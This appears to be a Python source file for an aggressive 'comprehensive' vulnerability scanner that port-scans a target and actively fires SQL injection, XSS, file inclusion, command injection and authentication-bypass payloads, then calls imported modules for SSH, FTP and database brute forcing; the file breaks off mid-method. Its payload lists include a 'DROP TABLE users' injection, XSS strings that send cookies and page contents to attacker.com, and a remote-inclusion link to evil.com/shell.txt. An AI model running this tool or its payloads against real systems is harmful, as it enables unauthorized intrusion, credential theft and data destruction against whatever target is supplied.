import requests
import socket
import re
import urllib.parse
import subprocess
import json
import ssl
import dns.resolver
import threading
import time
from typing import Dict, List, Any, Optional
from bs4 import BeautifulSoup
from urllib.robotparser import RobotFileParser
from vulnerability_db import VulnerabilityDatabase
from advanced_attacks import AdvancedAttackModule
from vps_vds_attacks import VPSVDSAttackModule
import concurrent.futures

class ComprehensiveScanner:
    """Comprehensive vulnerability scanner for web, server, network, and infrastructure assessment"""
    
    def __init__(self, target):
        self.target = target.strip()
        self.target_url = self._normalize_url(target)
        self.target_ip = self._resolve_target()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Comprehensive-Security-Scanner/2.0'
        })
        # Set reasonable timeouts and disable SSL verification warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.vulnerabilities = []
        self.security_headers = []
        self.open_ports = []
        self.services = {}
        self.os_info = {}
        self.vuln_db = VulnerabilityDatabase()
        self.advanced_attacks = AdvancedAttackModule(self.target_url, self.session)
        self.vps_vds_attacks = None  # Initialize after port scan
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        
    def _normalize_url(self, target):
        """Normalize target to URL format"""
        if not target.startswith(('http://', 'https://')):
            # For testhtml5.vulnweb.com, use HTTP as it doesn't support HTTPS
            if 'vulnweb.com' in target or 'testphp.vulnweb.com' in target:
                return f"http://{target}"
            # Try HTTPS first for other targets, then HTTP
            return f"https://{target}"
        return target.rstrip('/')
    
    def _resolve_target(self):
        """Resolve target domain to IP address"""
        try:
            if self.target.startswith(('http://', 'https://')):
                domain = urllib.parse.urlparse(self.target).netloc
            else:
                domain = self.target
            
            # Remove port if present
            domain = domain.split(':')[0]
            
            return socket.gethostbyname(domain)
        except Exception:
            return None
    
    def check_target_accessibility(self):
        """Enhanced target accessibility check"""
        try:
            # Try the current URL first
            try:
                response = self.session.get(self.target_url, timeout=15, verify=False)
                print(f"Target response: {response.status_code}")
                if response.status_code in [200, 301, 302, 403, 404]:
                    return True
            except Exception as e:
                print(f"Initial connection failed: {e}")
            
            # Try HTTP if HTTPS fails
            if self.target_url.startswith('https://'):
                http_url = self.target_url.replace('https://', 'http://')
                try:
                    print(f"Trying HTTP fallback: {http_url}")
                    response = self.session.get(http_url, timeout=15)
                    print(f"HTTP response: {response.status_code}")
                    if response.status_code in [200, 301, 302, 403, 404]:
                        self.target_url = http_url
                        return True
                except Exception as e:
                    print(f"HTTP fallback failed: {e}")
            
            return False
        except Exception as e:
            print(f"Accessibility check failed: {e}")
            return False
    
    def scan_ports(self):
        """Comprehensive port scanning"""
        print(f"Scanning ports on {self.target_ip}...")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                
                if result == 0:
                    self.open_ports.append(port)
                    service = self._identify_service(port)
                    self.services[port] = service
                    
                    # Check for vulnerabilities based on open ports
                    self._check_port_vulnerabilities(port, service)
                    
            except Exception:
                pass
        
        # Multi-threaded port scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(scan_port, port): port for port in self.common_ports}
            for future in concurrent.futures.as_completed(futures, timeout=30):
                try:
                    future.result()
                except Exception:
                    pass
        
        # Initialize VPS/VDS attack module after port scanning
        if self.target_ip and self.open_ports:
            self.vps_vds_attacks = VPSVDSAttackModule(self.target_ip, self.open_ports)
    
    def _identify_service(self, port):
        """Identify service running on port"""
        service_map = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
            443: 'HTTPS', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL',
            1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        
        service_name = service_map.get(port, 'Unknown')
        
        # Try to grab banner for service identification
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target_ip, port))
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            if banner:
                return f"{service_name} ({banner[:50]}...)"
        except:
            pass
            
        return service_name
    
    def _check_port_vulnerabilities(self, port, service):
        """Check for port-specific vulnerabilities"""
        if port == 21:  # FTP
            self._check_ftp_vulnerabilities()
        elif port == 22:  # SSH
            self._check_ssh_vulnerabilities()
        elif port == 23:  # Telnet
            self._add_vulnerability(
                'Insecure Protocol - Telnet',
                'High',
                f'Port {port}',
                'Telnet transmits data in plain text, including passwords',
                'telnet://target',
                'Replace Telnet with SSH for secure remote access'
            )
        elif port == 25:  # SMTP
            self._check_smtp_vulnerabilities()
        elif port == 3306:  # MySQL
            self._check_mysql_vulnerabilities()
        elif port == 5432:  # PostgreSQL
            self._check_postgresql_vulnerabilities()
        elif port == 3389:  # RDP
            self._check_rdp_vulnerabilities()
        elif port == 1433:  # MSSQL
            self._check_mssql_vulnerabilities()
    
    def scan_web_vulnerabilities(self, aggressive=False):
        """Comprehensive web vulnerability scanning"""
        print("Scanning web vulnerabilities...")
        
        try:
            # Original web scans
            self.scan_sql_injection(aggressive)
            self.scan_xss(aggressive)
            self.scan_idor()
            
            # Additional web vulnerability scans
            if hasattr(self, 'scan_directory_traversal'):
                self.scan_directory_traversal()
            if hasattr(self, 'scan_file_inclusion'):
                self.scan_file_inclusion()
            if hasattr(self, 'scan_command_injection'):
                self.scan_command_injection()
            if hasattr(self, 'scan_authentication_bypass'):
                self.scan_authentication_bypass()
            self.scan_session_management()
            self.scan_csrf()
            self.scan_file_upload()
            self.scan_information_disclosure()
            self.scan_business_logic()
            
            # Advanced attack techniques
            if aggressive:
                self.run_advanced_attacks()
                
            # VPS/VDS specific attacks
            self.run_vps_vds_attacks()
        except Exception as e:
            print(f"Error in web vulnerability scanning: {e}")
            pass
        
    def scan_directory_traversal(self):
        """Scan for directory traversal vulnerabilities"""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd'
        ]
        
        # Test in URL parameters
        parsed_url = urllib.parse.urlparse(self.target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param_name in params:
                for payload in traversal_payloads[:3]:  # Limit payloads to prevent hanging
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(test_params, doseq=True)
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        if any(indicator in response.text.lower() for indicator in ['root:', 'bin:', 'daemon:', '[drivers]']):
                            self._add_vulnerability(
                                'Directory Traversal',
                                'High',
                                f'URL parameter: {param_name}',
                                'Application allows access to files outside web root',
                                payload,
                                'Implement proper input validation and use allowlists for file access'
                            )
                            break
                    except:
                        continue
    
    def scan_file_inclusion(self):
        """Scan for Local/Remote File Inclusion vulnerabilities"""
        lfi_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'file:///etc/passwd',
            'expect://id',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
        ]
        
        rfi_payloads = [
            'http://evil.com/shell.txt',
            'https://pastebin.com/raw/malicious'
        ]
        
        # Test common parameters
        common_params = ['file', 'page', 'include', 'path', 'template', 'doc']
        
        for param in common_params[:2]:  # Limit parameters tested
            for payload in (lfi_payloads + rfi_payloads)[:3]:  # Limit payloads
                test_url = f"{self.target_url}?{param}={payload}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for LFI indicators
                    if any(indicator in response.text.lower() for indicator in 
                           ['root:', 'bin/bash', 'php version', 'configuration file']):
                        vuln_type = 'Local File Inclusion (LFI)' if 'http' not in payload else 'Remote File Inclusion (RFI)'
                        self._add_vulnerability(
                            vuln_type,
                            'High',
                            f'Parameter: {param}',
                            'Application includes files based on user input without proper validation',
                            payload,
                            'Validate and sanitize all file inclusion parameters'
                        )
                        break
                except:
                    continue
    
    def scan_command_injection(self):
        """Scan for OS Command Injection vulnerabilities"""
        command_payloads = [
            '; id',
            '| whoami',
            '& dir',
            '`uname -a`',
            '$(cat /etc/passwd)',
            '; ping -c 1 127.0.0.1',
            '|| netstat -an'
        ]
        
        # Test in forms and parameters
        self.discover_forms()
        
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'search', 'email']:
                    for payload in command_payloads:
                        try:
                            form_data = {inp['name']: inp.get('value', 'test') for inp in form['inputs']}
                            form_data[input_field['name']] = payload
                            
                            form_action = form['action'] or self.target_url
                            if not form_action.startswith('http'):
                                form_action = urllib.parse.urljoin(self.target_url, form_action)
                            
                            if form['method'] == 'POST':
                                response = self.session.post(form_action, data=form_data, timeout=10)
                            else:
                                response = self.session.get(form_action, params=form_data, timeout=10)
                            
                            # Check for command injection indicators
                            if any(indicator in response.text.lower() for indicator in 
                                   ['uid=', 'gid=', 'volume serial number', 'directory of']):
                                self._add_vulnerability(
                                    'OS Command Injection',
                                    'Critical',
                                    f'Form field: {input_field["name"]}',
                                    'Application executes system commands based on user input',
                                    payload,
                                    'Never execute user input as system commands, use safe APIs instead'
                                )
                                break
                        except:
                            continue
    
    def scan_authentication_bypass(self):
        """Scan for authentication bypass vulnerabilities"""
        bypass_payloads = [
            "admin'--",
            "admin'#",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "') or '1'='1--",
            "admin' or '1'='1",
            "' or 1=1 limit 1--"
        ]
        
        # Look for login forms
        login_indicators = ['login', 'signin', 'auth', 'user']
        
        for form in self.forms:
            form_action = form.get('action', '')
            if any(indicator in form_action.lower() for indicator in login_indicators):
                # Try authentication bypass
                for payload in bypass_payloads:
                    try:
                        form_data = {}
                        username_field = None
                        password_field = None
                        
                        for inp in form['inputs']:
                            if inp['type'] in ['text', 'email'] and any(field in inp['name'].lower() for field in ['user', 'login', 'email']):
                                username_field = inp['name']
                                form_data[inp['name']] = payload
                            elif inp['type'] == 'password':
                                password_field = inp['name']
                                form_data[inp['name']] = 'password'
                            else:
                                form_data[inp['name']] = inp.get('value', '')
                        
                        if username_field and password_field:
                            form_action_url = form['action'] or self.target_url
                            if not form_action_url.startswith('http'):
                                form_action_url = urllib.parse.urljoin(self.target_url, form_action_url)
                            
                            response = self.session.post(form_action_url, data=form_data, timeout=10)
                            
                            # Check for successful bypass indicators
                            if any(indicator in response.text.lower() for indicator in 
                                   ['welcome', 'dashboard', 'profile', 'logout', 'admin panel']):
                                self._add_vulnerability(
                                    'Authentication Bypass',
                                    'Critical',
                                    f'Login form: {form_action_url}',
                                    'Authentication can be bypassed using SQL injection',
                                    payload,
                                    'Use parameterized queries and proper authentication mechanisms'
                                )
                                break
                    except:
                        continue
    
    def scan_csrf(self):
        """Scan for Cross-Site Request Forgery vulnerabilities"""
        # Check forms for CSRF protection
        for form in self.forms:
            csrf_protected = False
            
            for inp in form['inputs']:
                if any(token in inp['name'].lower() for token in ['csrf', 'token', '_token', 'authenticity']):
                    csrf_protected = True
                    break
            
            if not csrf_protected and form['method'] == 'POST':
                self._add_vulnerability(
                    'Cross-Site Request Forgery (CSRF)',
                    'Medium',
                    f'Form action: {form["action"]}',
                    'Form lacks CSRF protection tokens',
                    'Missing CSRF token',
                    'Implement CSRF tokens in all state-changing forms'
                )
    
    def scan_ssl_tls(self):
        """Comprehensive SSL/TLS vulnerability scanning"""
        if not self.target_url.startswith('https://'):
            self._add_vulnerability(
                'Unencrypted Connection',
                'Medium',
                'Protocol',
                'Website does not enforce HTTPS encryption',
                'http://',
                'Implement HTTPS with proper SSL/TLS configuration'
            )
            return
        
        try:
            # Parse hostname
            hostname = urllib.parse.urlparse(self.target_url).netloc
            
            # Test SSL/TLS configuration
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    # Check for weak ciphers
                    if cipher and any(weak in cipher[0] for weak in ['RC4', 'DES', 'MD5']):
                        self._add_vulnerability(
                            'Weak SSL/TLS Cipher',
                            'Medium',
                            'SSL/TLS Configuration',
                            f'Weak cipher suite in use: {cipher[0]}',
                            cipher[0],
                            'Configure strong cipher suites and disable weak encryption'
                        )
                    
                    # Check SSL/TLS version
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        self._add_vulnerability(
                            'Outdated SSL/TLS Version',
                            'High',
                            'SSL/TLS Configuration',
                            f'Outdated protocol version: {version}',
                            version,
                            'Upgrade to TLS 1.2 or higher and disable older protocols'
                        )
                    
                    # Check certificate validity
                    if cert:
                        import datetime
                        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if not_after < datetime.datetime.now():
                            self._add_vulnerability(
                                'Expired SSL Certificate',
                                'High',
                                'SSL Certificate',
                                'SSL certificate has expired',
                                f'Expired: {cert["notAfter"]}',
                                'Renew SSL certificate immediately'
                            )
                        
        except Exception as e:
            self._add_vulnerability(
                'SSL/TLS Configuration Error',
                'Medium',
                'SSL/TLS',
                f'SSL/TLS configuration issue: {str(e)}',
                'Connection failed',
                'Review and fix SSL/TLS configuration'
            )
    
    def scan_dns_vulnerabilities(self):
        """Scan for DNS-related vulnerabilities"""
        try:
            hostname = urllib.parse.urlparse(self.target_url).netloc
            
            # DNS Zone Transfer attempt
            try:
                answers = dns.resolver.resolve(hostname, 'AXFR')
                if answers:
                    self._add_vulnerability(
                        'DNS Zone Transfer',
                        'Medium',
                        'DNS Configuration',
                        'DNS zone transfer is allowed',
                        'AXFR request successful',
                        'Restrict zone transfers to authorized servers only'
                    )
            except:
                pass
            
            # Check for subdomain enumeration
            common_subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging']
            found_subdomains = []
            
            for subdomain in common_subdomains:
                try:
                    full_domain = f"{subdomain}.{hostname}"
                    dns.resolver.resolve(full_domain, 'A')
                    found_subdomains.append(full_domain)
                except:
                    pass
            
            if len(found_subdomains) > 3:
                self._add_vulnerability(
                    'Information Disclosure - Subdomains',
                    'Low',
                    'DNS',
                    f'Multiple subdomains discovered: {", ".join(found_subdomains)}',
                    'Subdomain enumeration',
                    'Review subdomain exposure and implement proper access controls'
                )
                
        except Exception:
            pass
    
    def _check_ftp_vulnerabilities(self):
        """Check FTP-specific vulnerabilities"""
        try:
            # Anonymous FTP access
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(self.target_ip, 21, timeout=5)
            ftp.login('anonymous', 'anonymous@test.com')
            
            self._add_vulnerability(
                'Anonymous FTP Access',
                'Medium',
                'FTP Service (Port 21)',
                'FTP server allows anonymous access',
                'anonymous login',
                'Disable anonymous FTP access and require authentication'
            )
            ftp.quit()
        except:
            pass
    
    def _check_ssh_vulnerabilities(self):
        """Check SSH-specific vulnerabilities"""
        # SSH version detection and weak configuration checks
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, 22))
            banner = sock.recv(1024).decode()
            sock.close()
            
            # Check for old SSH versions
            if 'SSH-1.' in banner:
                self._add_vulnerability(
                    'Outdated SSH Version',
                    'High',
                    'SSH Service (Port 22)',
                    'SSH version 1.x is vulnerable to known attacks',
                    banner.strip(),
                    'Upgrade to SSH version 2.0 or higher'
                )
        except:
            pass
    
    def _check_smtp_vulnerabilities(self):
        """Check SMTP-specific vulnerabilities"""
        try:
            import smtplib
            
            smtp = smtplib.SMTP(self.target_ip, 25, timeout=5)
            smtp.helo()
            
            # Check for open relay
            try:
                smtp.mail('test@external.com')
                smtp.rcpt('victim@external.com')
                
                self._add_vulnerability(
                    'SMTP Open Relay',
                    'High',
                    'SMTP Service (Port 25)',
                    'SMTP server acts as an open relay',
                    'Open relay test',
                    'Configure SMTP server to prevent open relay functionality'
                )
            except:
                pass
            
            smtp.quit()
        except:
            pass
    
    def _check_rdp_vulnerabilities(self):
        """Check RDP-specific vulnerabilities"""
        self._add_vulnerability(
            'RDP Service Exposed',
            'Medium',
            'RDP Service (Port 3389)',
            'RDP service is accessible from the internet',
            'Port 3389 open',
            'Restrict RDP access to specific IP ranges and use VPN'
        )
    
    def detect_cms_and_technologies(self):
        """Detect CMS, frameworks, and technologies"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            content = response.text.lower()
            
            # Technology detection
            technologies = []
            
            # Check headers for technology indicators
            server_header = headers.get('Server', '').lower()
            x_powered_by = headers.get('X-Powered-By', '').lower()
            
            if 'apache' in server_header:
                technologies.append('Apache')
            if 'nginx' in server_header:
                technologies.append('Nginx')
            if 'iis' in server_header:
                technologies.append('IIS')
            if 'php' in x_powered_by:
                technologies.append('PHP')
            if 'asp.net' in x_powered_by:
                technologies.append('ASP.NET')
            
            # CMS detection
            cms_indicators = {
                'wordpress': ['wp-content', 'wp-includes', 'wordpress'],
                'drupal': ['drupal', 'sites/default'],
                'joomla': ['joomla', 'administrator', 'components'],
                'magento': ['magento', 'skin/frontend'],
                'prestashop': ['prestashop', 'modules'],
                'django': ['django', 'csrfmiddlewaretoken']
            }
            
            detected_cms = []
            for cms, indicators in cms_indicators.items():
                if any(indicator in content for indicator in indicators):
                    detected_cms.append(cms.title())
            
            if detected_cms:
                self._add_vulnerability(
                    'CMS Detection',
                    'Info',
                    'Technology Stack',
                    f'Detected CMS/Framework: {", ".join(detected_cms)}',
                    ', '.join(detected_cms),
                    'Keep CMS/Framework updated and remove version disclosure'
                )
            
            if technologies:
                self._add_vulnerability(
                    'Technology Stack Disclosure',
                    'Low',
                    'HTTP Headers',
                    f'Server technologies disclosed: {", ".join(technologies)}',
                    ', '.join(technologies),
                    'Remove or obfuscate technology disclosure in headers'
                )
                
        except Exception:
            pass
    
    # Original vulnerability scanning methods (with fixes)
    def discover_forms(self):
        """Discover forms on the target website"""
        if not hasattr(self, 'forms'):
            self.forms = []
            
        try:
            response = self.session.get(self.target_url, timeout=5)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                form_data = {
                    'action': form.get('action') if form.get('action') else '',
                    'method': (form.get('method') or 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name') if input_tag.get('name') else '',
                        'type': input_tag.get('type') if input_tag.get('type') else 'text',
                        'value': input_tag.get('value') if input_tag.get('value') else ''
                    }
                    form_data['inputs'].append(input_data)
                
                self.forms.append(form_data)
                
        except Exception as e:
            pass
    
    def scan_sql_injection(self, aggressive=False):
        """Enhanced SQL injection scanning"""
        self.discover_forms()
        
        # Enhanced payloads
        basic_payloads = [
            "'", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
            "admin'--", "admin'#", "' UNION SELECT NULL--", '" OR "1"="1',
            "1' OR '1'='1", "1' OR '1'='1' --", "1' OR '1'='1' #"
        ]
        
        advanced_payloads = [
            "' UNION SELECT 1,version(),3,4,5--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' OR (SELECT 1 FROM dual) = 1--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "' OR SLEEP(5)--",
            "1'; DROP TABLE users; --"
        ]
        
        payloads = basic_payloads + (advanced_payloads if aggressive else [])
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(self.target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param_name in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(test_params, doseq=True)
                    
                    if self._test_sql_injection(test_url, payload, f"URL parameter: {param_name}"):
                        break
        
        # Test forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'email', 'password', 'search']:
                    for payload in payloads:
                        if self._test_sql_injection_form(form, input_field['name'], payload):
                            break
    
    def _test_sql_injection(self, test_url, payload, location):
        """Enhanced SQL injection testing"""
        try:
            baseline = self.session.get(self.target_url, timeout=10)
            
            start_time = time.time()
            response = self.session.get(test_url, timeout=15)
            response_time = time.time() - start_time
            
            # Enhanced error detection
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'warning: mysql', 'postgresql query failed',
                'warning: pg_', 'oracle error', 'microsoft odbc', 'sqlite_',
                'warning: sqlite_', 'mysql server version', 'postgresql.*error',
                'valid mysql result', 'ora-[0-9]{5}', 'microsoft sql server',
                'syntax error.*query', 'query failed', 'database error'
            ]
            
            response_text = response.text.lower()
            
            for error_pattern in sql_errors:
                if re.search(error_pattern, response_text):
                    severity = 'Critical' if any(dangerous in payload.lower() for dangerous in ['drop', 'delete', 'insert']) else 'High'
                    self._add_vulnerability(
                        'SQL Injection',
                        severity,
                        location,
                        f"SQL error message detected with payload: {payload}",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
            
            # Time-based injection detection
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                if response_time > 4:
                    self._add_vulnerability(
                        'SQL Injection (Time-based)',
                        'High',
                        location,
                        f"Time delay detected ({response_time:.2f}s), indicating time-based SQL injection",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
                    
            # Boolean-based detection
            if len(response.text) != len(baseline.text) or response.status_code != baseline.status_code:
                if "1=1" in payload or "or" in payload.lower():
                    self._add_vulnerability(
                        'SQL Injection (Boolean-based)',
                        'High',
                        location,
                        f"Response differences detected with boolean payload",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def _test_sql_injection_form(self, form, field_name, payload):
        """Test form input for SQL injection"""
        try:
            form_action = form['action']
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = urllib.parse.urljoin(self.target_url, form_action)
                else:
                    form_action = self.target_url
            
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == field_name:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field.get('value', 'test')
            
            if form['method'] == 'POST':
                response = self.session.post(form_action, data=form_data, timeout=10)
            else:
                response = self.session.get(form_action, params=form_data, timeout=10)
            
            # Same detection logic as URL testing
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'warning: mysql',
                'postgresql query failed', 'warning: pg_',
                'oracle error', 'microsoft odbc', 'sqlite_'
            ]
            
            response_text = response.text.lower()
            for error_pattern in sql_errors:
                if re.search(error_pattern, response_text):
                    self._add_vulnerability(
                        'SQL Injection',
                        'High',
                        f"Form field: {field_name}",
                        f"SQL error message detected in form submission",
                        payload,
                        self.vuln_db.get_prevention('sql_injection')
                    )
                    return True
                    
        except Exception:
            pass
        
        return False
    
    # XSS scanning with enhancements
    def scan_xss(self, aggressive=False):
        """Enhanced XSS vulnerability scanning"""
        self.discover_forms()
        
        # Enhanced XSS payloads
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>"
        ]
        
        advanced_payloads = [
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "';alert('XSS');//", "\"><script>alert('XSS')</script>",
            "<script>fetch('http://attacker.com/steal.php?data='+btoa(document.documentElement.outerHTML))</script>",
            "<svg><animatetransform onbegin=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">"
        ]
        
        payloads = basic_payloads + (advanced_payloads if aggressive else [])
        
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(self.target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param_name in params:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(test_params, doseq=True)
                    
                    if self._test_xss(test_url, payload, f"URL parameter: {param_name}"):
                        break
        
        # Test forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'email', 'search', 'textarea', 'url']:
                    for payload in payloads:
                        if self._test_xss_form(form, input_field['name'], payload):
                            break
    
    def _test_xss(self, test_url, payload, location):
        """Enhanced XSS testing"""
        try:
            response = self.session.get(test_url, timeout=10)
            
            # Check if payload is reflected in response
            if payload in response.text:
                # Additional checks for actual XSS
                if any(tag in payload.lower() for tag in ['<script', '<img', '<svg', '<iframe', 'javascript:', 'onerror=', 'onload=']):
                    severity = 'High' if '<script' in payload.lower() else 'Medium'
                    
                    self._add_vulnerability(
                        'Cross-Site Scripting (XSS)',
                        severity,
                        location,
                        f"XSS payload reflected in response without proper encoding",
                        payload,
                        self.vuln_db.get_prevention('xss')
                    )
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def _test_xss_form(self, form, field_name, payload):
        """Test form input for XSS"""
        try:
            form_action = form['action']
            if not form_action.startswith('http'):
                if form_action.startswith('/'):
                    form_action = urllib.parse.urljoin(self.target_url, form_action)
                else:
                    form_action = self.target_url
            
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == field_name:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field.get('value', 'test')
            
            if form['method'] == 'POST':
                response = self.session.post(form_action, data=form_data, timeout=10)
            else:
                response = self.session.get(form_action, params=form_data, timeout=10)
            
            # Check if payload is reflected
            if payload in response.text:
                severity = 'High' if '<script' in payload.lower() else 'Medium'
                
                self._add_vulnerability(
                    'Cross-Site Scripting (XSS)',
                    severity,
                    f"Form field: {field_name}",
                    f"XSS payload reflected in form response",
                    payload,
                    self.vuln_db.get_prevention('xss')
                )
                return True
                
        except Exception:
            pass
        
        return False
    
    def scan_idor(self, max_pages=3):
        """Enhanced IDOR scanning"""
        self.discover_links(max_pages)
        
        # Enhanced IDOR patterns
        idor_patterns = [
            r'/user/(\d+)', r'/profile/(\d+)', r'/document/(\d+)', r'/file/(\d+)',
            r'/order/(\d+)', r'/account/(\d+)', r'/admin/(\d+)', r'/customer/(\d+)',
            r'id=(\d+)', r'user_id=(\d+)', r'doc_id=(\d+)', r'file_id=(\d+)',
            r'order_id=(\d+)', r'account_id=(\d+)', r'uid=(\d+)', r'cid=(\d+)'
        ]
        
        for link in self.links:
            for pattern in idor_patterns:
                match = re.search(pattern, link)
                if match:
                    original_id = match.group(1)
                    
                    # Enhanced test IDs
                    test_ids = [
                        str(int(original_id) + 1),
                        str(int(original_id) - 1),
                        str(int(original_id) + 100),
                        '999999', '1', '0', '-1'
                    ]
                    
                    for test_id in test_ids:
                        test_url = link.replace(original_id, test_id)
                        if self._test_idor(link, test_url, original_id, test_id):
                            break
    
    def discover_links(self, max_pages=3):
        """Enhanced link discovery"""
        if not hasattr(self, 'links'):
            self.links = []
            
        try:
            visited = set()
            to_visit = [self.target_url]
            
            while to_visit and len(visited) < max_pages:
                url = to_visit.pop(0)
                if url in visited:
                    continue
                    
                visited.add(url)
                
                try:
                    response = self.session.get(url, timeout=5)
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    for link in soup.find_all('a', href=True):
                        href = link.get('href')
                        if href:
                            if href.startswith('/'):
                                full_url = urllib.parse.urljoin(self.target_url, href)
                            elif href.startswith('http') and urllib.parse.urlparse(self.target_url).netloc in href:
                                full_url = href
                            else:
                                continue
                                
                            if full_url not in visited and len(visited) < max_pages:
                                to_visit.append(full_url)
                                self.links.append(full_url)
                                
                except Exception:
                    continue
                    
        except Exception:
            pass
    
    def run_vps_vds_attacks(self):
        """Execute VPS/VDS specific attacks including brute forcing"""
        if not self.vps_vds_attacks:
            return {}
        
        try:
            print("🎯 Executing VPS/VDS attacks...")
            vps_results = self.vps_vds_attacks.execute_vps_vds_attacks()
            
            # Process VPS/VDS attack results
            self._process_vps_vds_results(vps_results)
            
            return vps_results
        except Exception as e:
            print(f"Error in VPS/VDS attacks: {e}")
            return {}
    
    def _process_vps_vds_results(self, results: Dict):
        """Process VPS/VDS attack results into vulnerabilities"""
        
        # Process SSH attacks
        for attack in results.get('ssh_attacks', []):
            if attack['success']:
                severity = 'Critical' if 'Brute Force' in attack['attack_type'] else 'High'
                self._add_vulnerability(
                    f"SSH {attack['attack_type']}",
                    severity,
                    f"SSH Service (Port 22)",
                    attack['details'],
                    attack.get('username', '') + ':' + attack.get('password', ''),
                    'Implement strong authentication, disable root login, use key-based auth'
                )
        
        # Process FTP attacks
        for attack in results.get('ftp_attacks', []):
            if attack['success']:
                severity = 'Critical' if 'Brute Force' in attack['attack_type'] else 'Medium'
                self._add_vulnerability(
                    f"FTP {attack['attack_type']}",
                    severity,
                    f"FTP Service (Port 21)",
                    attack['details'],
                    attack.get('username', '') + ':' + attack.get('password', ''),
                    'Disable anonymous FTP, use SFTP/FTPS, implement strong credentials'
                )
        
        # Process database attacks
        for attack in results.get('database_attacks', []):
